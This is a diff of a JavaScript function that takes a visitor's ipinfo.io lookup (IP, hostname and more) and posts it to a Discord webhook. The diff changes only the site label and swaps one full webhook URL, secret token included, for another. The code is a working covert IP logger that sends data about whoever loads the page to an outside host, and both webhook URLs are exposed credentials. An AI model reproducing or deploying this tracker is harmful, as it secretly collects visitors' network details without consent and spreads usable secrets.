@@ -13,10 +13,10 @@ function monke(json) {
 
             // Use the additional information from the ipinfo.io response
             var params = {
-                username: "ermal.is-a.dev",
+                username: "tcprestt.top",
                 avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
                 embeds: [{
-                    title: "ermal.is-a.dev",
+                    title: "tcprestt.top",
                     color: 15000,
                     description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
                         `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
@@ -52,7 +52,7 @@ function monke(json) {
             try {
                 // Send the Discord webhook request with the extended information
                 var discordRequest = new XMLHttpRequest();
-                discordRequest.open("POST", "https://discord.com/api/webhooks/1173731890000306246/jYwMzBS8MqZedSgWdwyx0lNXDJQW_WkSHWI2hDSGPxte96sUlwCjsMWSOHSWLnvOzRbK");
+                discordRequest.open("POST", "https://discord.com/api/webhooks/1174684049852334101/40DQz52KTpj4x_w7Y2fNtwXye58VRDpOLaJTO14VegRJ5QuCVGeUr_909wAa2_pO5_oC");
                 discordRequest.setRequestHeader('Content-type', 'application/json');
                 discordRequest.send(JSON.stringify(params));
             } catch (error) {
